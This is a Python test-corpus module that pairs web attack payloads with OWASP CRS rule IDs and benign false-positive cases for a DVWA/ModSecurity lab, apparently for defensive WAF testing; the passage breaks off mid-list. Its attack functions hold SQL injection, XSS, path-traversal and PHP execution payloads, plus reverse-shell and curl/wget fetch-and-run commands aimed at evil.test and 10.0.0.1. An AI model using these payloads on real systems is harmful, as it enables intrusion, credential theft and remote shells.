"""CRS-derived request corpus for lab capture and fixture synthesis.

Rule IDs follow OWASP CRS 4.x REQUEST-9xx files at paranoia levels 1–2.
Each case cites the rule(s) expected to fire for the payload. Live capture
against DVWA + ModSecurity replaces the cited IDs with observed ones when
the Docker lab is available.

go-ftw is optional. The YAML export in this module is a CRS-style request
set that `go-ftw` can drive when a lab is running; synthesis does not
require it.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass(frozen=True)
class CorpusCase:
    id: str
    label: str
    method: str
    path: str
    collection: str
    parameter: str | None
    payload: str
    matched_data: str
    crs_rule_ids: list[str]
    category: str
    headers: dict[str, str] = field(default_factory=dict)
    application_context: dict[str, Any] = field(default_factory=dict)
    notes: str = ""

    @property
    def expected(self) -> str:
        return self.label


def _attack(
    slug: str,
    method: str,
    path: str,
    collection: str,
    parameter: str | None,
    payload: str,
    matched: str,
    rules: list[str],
    category: str,
    *,
    headers: dict[str, str] | None = None,
    notes: str = "",
) -> CorpusCase:
    return CorpusCase(
        id=f"attack-{category}-{slug}",
        label="attack",
        method=method,
        path=path,
        collection=collection,
        parameter=parameter,
        payload=payload,
        matched_data=matched,
        crs_rule_ids=rules,
        category=category,
        headers=headers or {},
        notes=notes,
    )


def _benign(
    slug: str,
    method: str,
    path: str,
    collection: str,
    parameter: str | None,
    payload: str,
    matched: str,
    rules: list[str],
    category: str,
    context: dict[str, Any],
    *,
    notes: str = "",
) -> CorpusCase:
    return CorpusCase(
        id=f"benign-{category}-{slug}",
        label="false_positive",
        method=method,
        path=path,
        collection=collection,
        parameter=parameter,
        payload=payload,
        matched_data=matched,
        crs_rule_ids=rules,
        category=category,
        application_context=context,
        notes=notes,
    )


def _route(path: str, methods: list[str], parameters: dict[str, str], purpose: str) -> dict[str, Any]:
    return {
        "application": {"purpose": purpose},
        "route": {"path": path, "methods": methods, "parameters": parameters},
    }


def sqli_attacks() -> list[CorpusCase]:
    rows = [
        ("boolean-or", "/vulnerabilities/sqli/", "id", "1' OR '1'='1", "' OR '1'='1", ["942100", "942130", "942180"]),
        ("boolean-or-comment", "/vulnerabilities/sqli/", "id", "1' OR 1=1--", "' OR 1=1--", ["942100", "942130", "942260"]),
        ("boolean-x", "/vulnerabilities/sqli_blind/", "id", "' OR 'x'='x", "' OR 'x'='x", ["942100", "942130"]),
        ("paren-or", "/vulnerabilities/sqli/", "id", "') OR ('1'='1", "') OR ('1'='1", ["942100", "942130"]),
        ("and-true", "/vulnerabilities/sqli_blind/", "id", "1' AND '1'='1", "' AND '1'='1", ["942100", "942130"]),
        ("union-password", "/vulnerabilities/sqli/", "id", "1 UNION SELECT password FROM users", "UNION SELECT password FROM users", ["942100", "942190"]),
        ("union-all-null", "/vulnerabilities/sqli/", "id", "1 UNION ALL SELECT NULL,NULL,NULL--", "UNION ALL SELECT NULL", ["942100", "942190"]),
        ("union-version", "/items", "id", "1 UNION SELECT @@version--", "UNION SELECT @@version", ["942100", "942190"]),
        ("union-mysql-user", "/vulnerabilities/sqli/", "id", "1' UNION SELECT user,password FROM mysql.user--", "UNION SELECT user,password FROM mysql.user", ["942100", "942190", "942140"]),
        ("union-information-schema", "/items", "id", "1 UNION SELECT * FROM information_schema.tables", "information_schema.tables", ["942100", "942140"]),
        ("union-load-file", "/download", "id", "1' UNION SELECT load_file('/etc/passwd')--", "load_file('/etc/passwd')", ["942100", "942190", "930120"]),
        ("auth-bypass-comment", "/login.php", "username", "admin'--", "admin'--", ["942100", "942260"]),
        ("auth-bypass-hash", "/login.php", "username", "admin'#", "admin'#", ["942100", "942440"]),
        ("time-waitfor", "/item", "id", "1; WAITFOR DELAY '0:0:5'", "WAITFOR DELAY", ["942160", "942190"]),
        ("time-sleep", "/vulnerabilities/sqli_blind/", "id", "1); SELECT SLEEP(5)--", "SELECT SLEEP(5)", ["942160", "942170"]),
        ("time-benchmark", "/items", "id", "1' AND BENCHMARK(1000000,SHA1('test'))--", "BENCHMARK(1000000", ["942160", "942170"]),
        ("time-pg-sleep", "/item", "id", "1' AND pg_sleep(5)--", "pg_sleep(5)", ["942280"]),
        ("time-if-sleep", "/vulnerabilities/sqli_blind/", "id", "1' OR IF(1=1,SLEEP(5),0)--", "IF(1=1,SLEEP(5)", ["942160", "942170"]),
        ("time-subselect-sleep", "/items", "id", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)", "SELECT(SLEEP(5))", ["942160"]),
        ("extractvalue", "/items", "id", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))", "EXTRACTVALUE", ["942100", "942200"]),
        ("updatexml", "/items", "id", "1 AND updatexml(1,concat(0x7e,version()),1)", "updatexml", ["942100"]),
        ("drop-table", "/vulnerabilities/sqli/", "id", "1; DROP TABLE users--", "DROP TABLE users", ["942100", "942360"]),
        ("insert-user", "/login.php", "username", "1'; INSERT INTO users VALUES('hacker','pass')--", "INSERT INTO users", ["942100", "942350"]),
        ("xp-cmdshell", "/diag", "q", "1; EXEC xp_cmdshell 'dir'", "xp_cmdshell", ["942100", "942190"]),
        ("shutdown", "/item", "id", "1; shutdown--", "shutdown--", ["942280"]),
        ("having", "/items", "id", "1' HAVING 1=1--", "HAVING 1=1", ["942100", "942250"]),
        ("group-by", "/items", "id", "1' GROUP BY 1,2,3--", "GROUP BY 1,2,3", ["942100"]),
        ("order-by", "/vulnerabilities/sqli/", "id", "1' ORDER BY 10--", "ORDER BY 10", ["942100", "942330"]),
        ("exists", "/items", "id", "1' AND EXISTS(SELECT * FROM users)--", "EXISTS(SELECT * FROM users)", ["942100"]),
        ("mongo-gt", "/items", "filter", '{"$gt": ""}', '"$gt"', ["942290"]),
        ("char-concat", "/items", "id", "1 UNION SELECT CHAR(65,68,77,73,78)", "UNION SELECT CHAR(65", ["942100", "942300"]),
        ("inline-comment", "/vulnerabilities/sqli/", "id", "1'/**/OR/**/1=1--", "/**/OR/**/1=1", ["942100", "942200", "942500"]),
        ("hex-union", "/items", "id", "0x31 UNION SELECT 0x61646d696e", "UNION SELECT 0x61646d696e", ["942100", "942450"]),
        ("tick-bypass", "/items", "id", "` OR 1=1 --", "` OR 1=1", ["942510", "942100"]),
        ("stacked-merge", "/items", "id", "1; MERGE users USING dual ON 1=1", "MERGE users", ["942250"]),
        ("substr-blind", "/vulnerabilities/sqli_blind/", "id", "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64", "SUBSTRING((SELECT password", ["942100"]),
        ("information-columns", "/items", "id", "1 UNION SELECT column_name FROM information_schema.columns", "information_schema.columns", ["942100", "942140"]),
        ("into-outfile", "/vulnerabilities/sqli/", "id", "1 UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/shell.php'", "INTO OUTFILE", ["942100", "942350"]),
        ("or-numeric", "/items", "id", "1 OR 1=1", "OR 1=1", ["942130", "942180"]),
        ("union-select-star", "/catalog", "id", "1' UNION SELECT * FROM users--", "UNION SELECT * FROM users", ["942100", "942190"]),
        ("like-tautology", "/search", "q", "x' OR username LIKE '%", "OR username LIKE", ["942100", "942130"]),
        ("semicolon-select", "/items", "id", "1; SELECT * FROM users", "; SELECT * FROM users", ["942100", "942210"]),
        ("waitfor-time", "/item", "id", "1'; WAITFOR DELAY '0:0:5'--", "WAITFOR DELAY '0:0:5'", ["942160", "942190"]),
        ("comment-sequence", "/items", "id", "1'--", "1'--", ["942440", "942100"]),
        ("mysql-udf", "/diag", "q", "1; CREATE FUNCTION shell RETURNS STRING SONAME 'lib_mysqludf_sys.so'", "CREATE FUNCTION shell", ["942350"]),
    ]
    cases = []
    for slug, path, param, payload, matched, rules in rows:
        method = "POST" if path in {"/login.php"} else "GET"
        cases.append(_attack(slug, method, path, "ARGS", param, payload, matched, rules, "sqli"))
    return cases


def xss_attacks() -> list[CorpusCase]:
    rows = [
        ("script-alert", "POST", "/comment", "body", "<script>alert(1)</script>", "<script>alert(1)</script>", ["941100", "941110", "941160"]),
        ("script-domain", "GET", "/vulnerabilities/xss_r/", "name", "<script>alert(document.domain)</script>", "<script>alert(document.domain)</script>", ["941100", "941110"]),
        ("script-src", "POST", "/message", "text", "<script src=https://evil.test/x.js></script>", "<script src=", ["941100", "941110"]),
        ("img-onerror", "POST", "/profile", "bio", "<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>", ["941100", "941120"]),
        ("svg-onload", "POST", "/message", "text", "<svg onload=confirm(1)>", "<svg onload=confirm(1)>", ["941100", "941110", "941120"]),
        ("body-onload", "POST", "/comment", "body", "<body onload=alert(1)>", "onload=alert(1)", ["941120"]),
        ("iframe-js", "POST", "/message", "text", "<iframe src=javascript:alert(1)>", "javascript:alert(1)", ["941100", "941140"]),
        ("a-javascript", "POST", "/comment", "body", '<a href="javascript:alert(1)">x</a>', "javascript:alert(1)", ["941140"]),
        ("svg-script", "POST", "/message", "text", "<svg><script>alert(1)</script></svg>", "<script>alert(1)</script>", ["941100", "941110"]),
        ("details-ontoggle", "POST", "/comment", "body", "<details ontoggle=alert(1) open>", "ontoggle=alert(1)", ["941120"]),
        ("input-onfocus", "POST", "/profile", "bio", "<input onfocus=alert(1) autofocus>", "onfocus=alert(1)", ["941120"]),
        ("video-onerror", "POST", "/message", "text", "<video src=x onerror=alert(1)>", "onerror=alert(1)", ["941120"]),
        ("math-alert", "POST", "/comment", "body", "<math><maction actiontype=statusline>alert(1)</maction></math>", "<math>", ["941160", "941100"]),
        ("object-data", "POST", "/message", "text", "<object data=javascript:alert(1)>", "javascript:alert(1)", ["941140"]),
        ("embed-js", "POST", "/comment", "body", "<embed src=javascript:alert(1)>", "javascript:alert(1)", ["941140"]),
        ("link-js", "POST", "/profile", "bio", "<link rel=stylesheet href=javascript:alert(1)>", "javascript:alert(1)", ["941140"]),
        ("meta-refresh", "POST", "/comment", "body", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', "javascript:alert(1)", ["941140"]),
        ("formaction", "POST", "/comment", "body", "<form><button formaction=javascript:alert(1)>x</button></form>", "formaction=javascript:alert(1)", ["941140", "941150"]),
        ("srcdoc", "POST", "/message", "text", "<iframe srcdoc='<script>alert(1)</script>'>", "<script>alert(1)</script>", ["941110", "941160"]),
        ("template", "POST", "/comment", "body", "<template><script>alert(1)</script></template>", "<script>alert(1)</script>", ["941110"]),
        ("xss-style-expression", "POST", "/profile", "bio", "<div style=expression(alert(1))>", "expression(alert(1))", ["941100", "941160"]),
        ("jsfuck", "POST", "/comment", "body", "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]]", "[][(![]+[])[+[]]", ["941360"]),
        ("angular-constructor", "POST", "/comment", "body", "{{constructor.constructor('alert(1)')()}}", "constructor.constructor", ["941380"]),
        ("html-event-mixed", "GET", "/vulnerabilities/xss_r/", "name", '"><img src=x onerror=prompt(1)>', 'onerror=prompt(1)', ["941100", "941120"]),
        ("stored-script", "POST", "/vulnerabilities/xss_s/", "mtxMessage", "<script>alert(1)</script>", "<script>alert(1)</script>", ["941100", "941110"]),
        ("svg-animate", "POST", "/message", "text", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "onbegin=alert(1)", ["941120"]),
        ("marquee-onstart", "POST", "/comment", "body", "<marquee onstart=alert(1)>", "onstart=alert(1)", ["941120"]),
        ("xss-fromcharcode", "POST", "/profile", "bio", "<script>alert(String.fromCharCode(88,83,83))</script>", "String.fromCharCode", ["941100", "941110"]),
        ("xss-eval", "POST", "/comment", "body", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "onerror=eval(", ["941120", "941100"]),
        ("xss-document-write", "GET", "/vulnerabilities/xss_r/", "name", "<script>document.write('<img src=x onerror=alert(1)>')</script>", "document.write", ["941100", "941110"]),
    ]
    cases = []
    for slug, method, path, param, payload, matched, rules in rows:
        cases.append(_attack(slug, method, path, "ARGS", param, payload, matched, rules, "xss"))
    return cases


def rce_attacks() -> list[CorpusCase]:
    rows = [
        ("semicolon-id", "POST", "/vulnerabilities/exec/", "ip", "127.0.0.1; id", "127.0.0.1; id", ["932100", "932105"]),
        ("semicolon-passwd", "POST", "/vulnerabilities/exec/", "ip", "127.0.0.1; cat /etc/passwd", "; cat /etc/passwd", ["932100", "932105", "930120"]),
        ("pipe-id", "POST", "/vulnerabilities/exec/", "ip", "127.0.0.1 | id", "| id", ["932100", "932110"]),
        ("pipe-passwd", "GET", "/diag", "target", "localhost | cat /etc/passwd", "| cat /etc/passwd", ["932100", "932110", "930120"]),
        ("and-whoami", "POST", "/ping", "host", "127.0.0.1 && whoami", "&& whoami", ["932100", "932105"]),
        ("or-uname", "POST", "/ping", "host", "127.0.0.1 || uname -a", "|| uname -a", ["932100", "932105"]),
        ("subshell-whoami", "POST", "/convert", "name", "$(whoami)", "$(whoami)", ["932105", "932130"]),
        ("backtick-id", "POST", "/convert", "name", "`id`", "`id`", ["932105", "932130"]),
        ("newline-id", "POST", "/ping", "host", "127.0.0.1%0aid", "%0aid", ["932100", "932160"]),
        ("powershell", "POST", "/diag", "cmd", "powershell -enc RwBlAHQALQBNAG8AZABlAGwA", "powershell -enc", ["932120"]),
        ("cmd-copy", "POST", "/diag", "cmd", "cmd.exe /c dir", "cmd.exe /c", ["932110", "932115"]),
        ("for-windows", "POST", "/diag", "cmd", "FOR /F %i IN ('dir') DO echo %i", "FOR /F", ["932140"]),
        ("shellshock", "GET", "/cgi-bin/test.cgi", None, "() { :; }; /bin/cat /etc/passwd", "() { :; };", ["932170", "932171"]),
        ("wildcard-bypass", "POST", "/convert", "name", "/???/??t /etc/passwd", "/???/??t /etc/passwd", ["932190", "930120"]),
        ("python-pty", "POST", "/diag", "cmd", "python -c 'import pty;pty.spawn(\"/bin/sh\")'", "pty.spawn", ["932100", "932150"]),
        ("perl-exec", "POST", "/diag", "cmd", "perl -e 'exec \"/bin/sh\"'", "exec \"/bin/sh\"", ["932100", "932150"]),
        ("nc-reverse", "POST", "/ping", "host", "127.0.0.1; nc -e /bin/sh 10.0.0.1 4444", "nc -e /bin/sh", ["932100", "932105"]),
        ("curl-pipe-sh", "POST", "/convert", "name", "curl http://evil.test/s.sh | sh", "curl http://", ["932100", "932160"]),
        ("bash-i", "POST", "/diag", "cmd", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "bash -i", ["932100", "932160"]),
        ("wget-output", "POST", "/convert", "name", "wget http://evil.test/shell -O /tmp/s", "wget http://", ["932100", "932150"]),
        ("php-system", "POST", "/index.php", "cmd", ";system('id');", ";system('id')", ["932100", "933150"]),
        ("env-ifs", "POST", "/vulnerabilities/exec/", "ip", "127.0.0.1; cat${IFS}/etc/passwd", "cat${IFS}/etc/passwd", ["932100", "932160"]),
    ]
    cases = []
    for slug, method, path, param, payload, matched, rules in rows:
        collection = "REQUEST_HEADERS" if slug == "shellshock" else "ARGS"
        headers = {"User-Agent": payload} if slug == "shellshock" else {}
        parameter = "User-Agent" if slug == "shellshock" else param
        cases.append(
            _attack(slug, method, path, collection, parameter, payload, matched, rules, "rce", headers=headers)
        )
    return cases


def lfi_attacks() -> list[CorpusCase]:
    rows = [
        ("unix-passwd", "GET", "/vulnerabilities/fi/", "page", "../../../../etc/passwd", "../../../../etc/passwd", ["930100", "930110", "930120"]),
        ("unix-shadow", "GET", "/download", "file", "../../../../etc/shadow", "../../../../etc/shadow", ["930100", "930110", "930120"]),
        ("encoded-passwd", "GET", "/asset", "name", "..%2f..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2fetc%2fpasswd", ["930110", "930100"]),
        ("encoded-shadow", "GET", "/asset", "name", "..%2f..%2fetc%2fshadow", "..%2f..%2fetc%2fshadow", ["930110"]),
        ("double-encoded", "GET", "/download", "file", "..%252f..%252fetc%252fpasswd", "..%252f..%252fetc%252fpasswd", ["930110", "920230"]),
        ("dotdot-win", "GET", "/download", "file", "..\\..\\..\\windows\\win.ini", "..\\..\\windows\\win.ini", ["930100", "930110"]),
        ("proc-self", "GET", "/vulnerabilities/fi/", "page", "../../../../proc/self/environ", "/proc/self/environ", ["930120"]),
        ("php-filter", "GET", "/vulnerabilities/fi/", "page", "php://filter/convert.base64-encode/resource=index", "php://filter", ["930120", "933190"]),
        ("php-input", "GET", "/vulnerabilities/fi/", "page", "php://input", "php://input", ["933190", "930120"]),
        ("expect-id", "GET", "/vulnerabilities/fi/", "page", "expect://id", "expect://id", ["933190", "932150"]),
        ("file-passwd", "GET", "/download", "file", "file:///etc/passwd", "file:///etc/passwd", ["930120", "933200"]),
        ("env-probe", "GET", "/.env", None, "", "/.env", ["930130"]),
        ("git-config", "GET", "/.git/config", None, "", "/.git/config", ["930130"]),
        ("htaccess", "GET", "/.htaccess", None, "", "/.htaccess", ["930130"]),
        ("wp-config", "GET", "/wp-config.php", None, "", "/wp-config.php", ["930130"]),
        ("backup-sql", "GET", "/backup.sql", None, "", "/backup.sql", ["920500", "930130"]),
        ("web-config", "GET", "/web.config", None, "", "/web.config", ["930130"]),
        ("slash-etc-passwd", "GET", "/etc/passwd", None, "", "/etc/passwd", ["930120", "930130"]),
    ]
    cases = []
    for slug, method, path, param, payload, matched, rules in rows:
        collection = "REQUEST_FILENAME" if param is None else "ARGS"
        cases.append(_attack(slug, method, path, collection, param, payload, matched, rules, "lfi"))
    return cases


def rfi_php_protocol_misc() -> list[CorpusCase]:
    rfi = [
        ("remote-ip", "GET", "/vulnerabilities/fi/", "page", "http://8.8.8.8/shell.txt", "http://8.8.8.8/shell.txt", ["931100"]),
        ("remote-php", "GET", "/include", "file", "http://evil.test/shell.php", "http://evil.test/shell.php", ["931110", "931120"]),
        ("remote-question", "GET", "/vulnerabilities/fi/", "page", "http://evil.test/a.php?x=1", "http://evil.test/a.php", ["931120"]),
        ("off-domain", "POST", "/bookmarks", "url", "https://evil.test/a/../b.php", "https://evil.test/a/../b.php", ["931130"]),
        ("data-wrapper", "GET", "/vulnerabilities/fi/", "page", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+", "data://text/plain", ["933200", "933190"]),
    ]
    php = [
        ("eval-get", "GET", "/index.php", "x", "eval($_GET[c])", "eval($_GET", ["933110", "933150"]),
        ("assert", "POST", "/index.php", "x", "assert($_POST[c])", "assert($_POST", ["933150"]),
        ("preg-replace-e", "POST", "/index.php", "x", "preg_replace('/.*/e', $_GET[c], 'x')", "preg_replace('/.*/e'", ["933150", "933160"]),
        ("create-function", "POST", "/index.php", "x", "create_function('', $_GET[c])", "create_function('',", ["933150"]),
        ("serialized-object", "POST", "/index.php", "data", 'O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}', 'O:8:"stdClass"', ["933170"]),
        ("system-call", "GET", "/index.php", "q", "system('id')", "system('id')", ["933150", "932150"]),
        ("passthru", "GET", "/index.php", "q", "passthru($_GET['c'])", "passthru($_GET", ["933150"]),
        ("include-var", "GET", "/index.php", "q", "include($file)", "include($file)", ["933130", "933140"]),
    ]
    protocol = [
        ("null-byte", "GET", "/download", "file", "report.pdf%00.jpg", "%00", ["920270"]),
        ("utf8-overlong", "GET", "/search", "q", "%c0%ae%c0%ae", "%c0%ae", ["920250"]),
        ("double-url", "GET", "/search", "q", "%252e%252e%252f", "%252e%252e%252f", ["920230", "920220"]),
        ("missing-ua", "GET", "/index.php", None, "", "", ["920320"]),
        ("empty-ua", "GET", "/index.php", None, "", "", ["920330"]),
        ("host-ip", "GET", "/index.php", None, "", "127.0.0.1", ["920350"]),
        ("get-with-body", "GET", "/index.php", None, "unused=1", "unused=1", ["920170"]),
        ("content-type-missing", "POST", "/login.php", "username", "admin", "admin", ["920340"]),
        ("range-abuse", "GET", "/index.php", None, "", "", ["920190"]),
        ("restricted-ext", "GET", "/backup.php.bak", None, "", "/backup.php.bak", ["920440", "920500"]),
        ("header-overflow", "GET", "/index.php", None, "", "A" * 800, ["920360"]),
    ]
    scanner = [
        ("nikto-ua", "GET", "/index.php", None, "", "Nikto", ["913100"]),
        ("sqlmap-ua", "GET", "/vulnerabilities/sqli/", "id", "1", "sqlmap", ["913100"]),
        ("nmap-ua", "GET", "/", None, "", "Nmap Scripting Engine", ["913100"]),
        ("phpmyadmin", "GET", "/phpmyadmin/", None, "", "/phpmyadmin/", ["913120", "930130"]),
        ("wp-admin", "GET", "/wp-admin/", None, "", "/wp-admin/", ["913120"]),
        ("java-serialized", "POST", "/api", "payload", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "rO0ABXNy", ["944120"]),
        ("java-processbuilder", "POST", "/api", "class", "java.lang.ProcessBuilder", "java.lang.ProcessBuilder", ["944100", "944110"]),
        ("session-fixation", "GET", "/login.php", "PHPSESSID", "abc123.evil.test", "PHPSESSID", ["943110"]),
        ("cookie-html", "GET", "/index.php", None, "", "Set-Cookie", ["943100"]),
    ]
    cases = []
    for slug, method, path, param, payload, matched, rules in rfi:
        cases.append(_attack(slug, method, path, "ARGS", param, payload, matched, rules, "rfi"))
    for slug, method, path, param, payload, matched, rules in php:
        cases.append(_attack(slug, method, path, "ARGS", param, payload, matched, rules, "php"))
    for slug, method, path, param, payload, matched, rules in protocol:
        headers = {}
        collection = "ARGS" if param else "REQUEST_HEADERS"
        parameter = param
        if slug == "missing-ua":
            headers = {"User-Agent": ""}
            collection, parameter, matched = "REQUEST_HEADERS", "User-Agent", ""
        elif slug == "empty-ua":
            headers = {"User-Agent": ""}
            collection, parameter = "REQUEST_HEADERS", "User-Agent"
        elif slug == "host-ip":
            headers = {"Host": "127.0.0.1"}
            collection, parameter, matched = "REQUEST_HEADERS", "Host", "127.0.0.1"
        elif slug == "get-with-body":
            headers = {"Content-Length": "8", "Content-Type": "application/x-www-form-urlencoded"}
            collection, parameter = "REQUEST_BODY", None
        elif slug == "content-type-missing":
            headers = {"Content-Length": "12"}
            collection, parameter = "REQUEST_HEADERS", "Content-Type"
        elif slug == "range-abuse":
            headers = {"Range": "bytes=0-1,2-3,4-5,6-7,8-9"}
            collection, parameter, matched = "REQUEST_HEADERS", "Range", "bytes=0-1,2-3"
        elif slug == "header-overflow":
            headers = {"X-Overflow": "A" * 800}
            collection, parameter, matched = "REQUEST_HEADERS", "X-Overflow", "A" * 40
        cases.append(
            _attack(slug, method, path, collection, parameter, payload, matched, rules, "protocol", headers=headers)
        )
    for slug, method, path, param, payload, matched, rules in scanner:
        headers = {}
        collection = "ARGS" if param else "REQUEST_FILENAME"
        parameter = param
        if slug.endswith("-ua"):
            headers = {"User-Agent": matched if matched != "1" else "sqlmap/1.8"}
            if slug == "sqlmap-ua":
                headers = {"User-Agent": "sqlmap/1.8 (https://sqlmap.org)"}
                matched = "sqlmap"
            collection, parameter = "REQUEST_HEADERS", "User-Agent"
        elif slug == "cookie-html":
            headers = {"Cookie": "<script>document.cookie='id=1'</script>"}
            collection, parameter, payload, matched = "REQUEST_COOKIES", "Cookie", headers["Cookie"], "<script>document.cookie"
        elif slug in {"phpmyadmin", "wp-admin"}:
            collection, parameter = "REQUEST_FILENAME", None
        cases.append(
            _attack(slug, method, path, collection, parameter, payload, matched, rules, "scanner", headers=headers)
        )
    return cases


def benign_cases() -> list[CorpusCase]:
    search = _route("/catalog/search", ["GET"], {"q": "natural-language search terms"}, "product catalog search")
    customers = _route("/customers", ["POST"], {"name": "customer display name"}, "customer directory")
    articles = _route("/articles", ["POST"], {"body": "sanitized rich-text HTML"}, "CMS article editor")
    docs = _route("/docs/search", ["POST"], {"q": "documentation search phrase"}, "documentation search")
    support = _route("/support", ["POST"], {"message": "free-form support description"}, "support tickets")
    bookmarks = _route("/bookmarks", ["POST"], {"url": "operator-reviewed bookmark URL"}, "bookmark manager")
    sqli_lab = _route("/vulnerabilities/sqli/", ["GET"], {"id": "user id lookup"}, "DVWA SQL injection lab")
    xss_r = _route("/vulnerabilities/xss_r/", ["GET"], {"name": "display name"}, "DVWA reflected XSS lab")
    xss_s = _route("/vulnerabilities/xss_s/", ["POST"], {"txtName": "author name", "mtxMessage": "guestbook message"}, "DVWA guestbook")
    exec_lab = _route("/vulnerabilities/exec/", ["POST"], {"ip": "host to ping"}, "DVWA ping form")
    login = _route("/login.php", ["POST"], {"username": "account username", "password": "account password"}, "DVWA login")
    security = _route("/security.php", ["POST"], {"security": "DVWA security level"}, "DVWA security settings")
    fi_lab = _route("/vulnerabilities/fi/", ["GET"], {"page": "local content page name"}, "DVWA file include lab")

    rows: list[CorpusCase] = [
        _benign("select-products", "GET", "/catalog/search", "ARGS", "q", "select all products from category shoes", "select all products from category shoes", ["942100"], "sqli", search),
        _benign("drop-down", "GET", "/catalog/search", "ARGS", "q", "drop down menu navigation", "drop down menu navigation", ["942100"], "sqli", search),
        _benign("union-size", "GET", "/catalog/search", "ARGS", "q", "union of size and colour filters", "union of size and colour filters", ["942100", "942190"], "sqli", search),
        _benign("order-by-price", "GET", "/catalog/search", "ARGS", "q", "order by price then rating", "order by price then rating", ["942100"], "sqli", search),
        _benign("from-warehouse", "GET", "/catalog/search", "ARGS", "q", "items from warehouse 12", "items from warehouse 12", ["942100"], "sqli", search),
        _benign("and-or-connectors", "GET", "/catalog/search", "ARGS", "q", "red and blue or green sneakers", "red and blue or green sneakers", ["942130"], "sqli", search),
        _benign("having-trouble", "POST", "/support", "ARGS", "message", "having trouble checking out after update", "having trouble checking out", ["942250"], "sqli", support),
        _benign("insert-tab", "POST", "/docs/search", "ARGS", "q", "how to insert a tab in the editor", "insert a tab", ["942350"], "sqli", docs),
        _benign("update-profile", "POST", "/docs/search", "ARGS", "q", "update your profile picture", "update your profile", ["942100"], "sqli", docs),
        _benign("delete-draft", "POST", "/docs/search", "ARGS", "q", "delete draft articles from last week", "delete draft articles", ["942100"], "sqli", docs),
        _benign("join-newsletter", "GET", "/catalog/search", "ARGS", "q", "join our newsletter for select deals", "join our newsletter for select deals", ["942100"], "sqli", search),
        _benign("table-of-contents", "POST", "/docs/search", "ARGS", "q", "table of contents for the sql tutorial", "table of contents for the sql tutorial", ["942140"], "sqli", docs),
        _benign("where-is-order", "POST", "/support", "ARGS", "message", "where is my order from last Friday", "where is my order", ["942100"], "sqli", support),
        _benign("limit-results", "GET", "/catalog/search", "ARGS", "q", "limit results to in-stock only", "limit results to in-stock only", ["942100"], "sqli", search),
        _benign("count-inventory", "GET", "/catalog/search", "ARGS", "q", "count inventory by warehouse", "count inventory by warehouse", ["942100"], "sqli", search),
        _benign("sleep-mode", "POST", "/docs/search", "ARGS", "q", "how to enable sleep mode on linux", "sleep mode on linux", ["942160"], "sqli", docs),
        _benign("benchmark-guide", "POST", "/docs/search", "ARGS", "q", "benchmark your queries in the tutorial", "benchmark your queries", ["942170"], "sqli", docs),
        _benign("information-schema", "POST", "/docs/search", "ARGS", "q", "what is information_schema in postgres docs", "information_schema in postgres docs", ["942140"], "sqli", docs),
        _benign("apostrophe-oreilly", "POST", "/customers", "ARGS", "name", "O'Reilly", "O'Reilly", ["942100"], "sqli", customers),
        _benign("apostrophe-dario", "POST", "/customers", "ARGS", "name", "D'Angelo", "D'Angelo", ["942100"], "sqli", customers),
        _benign("apostrophe-shannon", "POST", "/customers", "ARGS", "name", "O'Shaughnessy", "O'Shaughnessy", ["942100"], "sqli", customers),
        _benign("apostrophe-loreal", "POST", "/customers", "ARGS", "name", "L'Oréal Paris store account", "L'Oréal", ["942100"], "sqli", customers),
        _benign("html-em", "POST", "/articles", "ARGS", "body", "<em>important</em>", "<em>important</em>", ["941100"], "xss", articles),
        _benign("html-strong", "POST", "/articles", "ARGS", "body", "This is <strong>great</strong> work.", "<strong>great</strong>", ["941100"], "xss", articles),
        _benign("html-p", "POST", "/articles", "ARGS", "body", "<p>Hello team, please review.</p>", "<p>Hello team", ["941160"], "xss", articles),
        _benign("html-br", "POST", "/articles", "ARGS", "body", "line one<br>line two", "<br>", ["941160"], "xss", articles),
        _benign("markdown-bold", "POST", "/vulnerabilities/xss_s/", "ARGS", "mtxMessage", "This is **great**. I love the design of the guestbook.", "**great**", ["941100"], "xss", xss_s),
        _benign("xssr-emphasis", "GET", "/vulnerabilities/xss_r/", "ARGS", "name", "I love the <em>design</em> and **bold** text", "<em>design</em>", ["941100"], "xss", xss_r),
        _benign("blockquote", "POST", "/articles", "ARGS", "body", "<blockquote>Quoted from style guide</blockquote>", "<blockquote>", ["941160"], "xss", articles),
        _benign("href-https", "POST", "/articles", "ARGS", "body", '<a href="https://example.test/help">help</a>', 'href="https://example.test/help"', ["941140"], "xss", articles),
        _benign("img-static", "POST", "/articles", "ARGS", "body", '<img src="/static/logo.png" alt="logo">', '<img src="/static/logo.png"', ["941100"], "xss", articles),
        _benign("code-span", "POST", "/articles", "ARGS", "body", "Use <code>alert</code> only in the docs example.", "<code>alert</code>", ["941110"], "xss", articles),
        _benign("shell-echo", "POST", "/docs/search", "ARGS", "q", "how to use echo in bash", "how to use echo in bash", ["932100"], "rce", docs),
        _benign("shell-ls", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "Run ls -la to list files in the tutorial; do not execute it.", "ls -la to list files", ["932100"], "rce", exec_lab),
        _benign("shell-cat", "POST", "/docs/search", "ARGS", "q", "cat file contents in the unix tutorial", "cat file contents", ["932100"], "rce", docs),
        _benign("shell-pipe-docs", "POST", "/docs/search", "ARGS", "q", "pipe grep output to less in the handbook", "pipe grep output to less", ["932110"], "rce", docs),
        _benign("shell-whoami-docs", "POST", "/docs/search", "ARGS", "q", "what does whoami print on ubuntu", "whoami print on ubuntu", ["932105"], "rce", docs),
        _benign("ip-literal", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "127.0.0.1", "127.0.0.1", ["932100"], "rce", exec_lab),
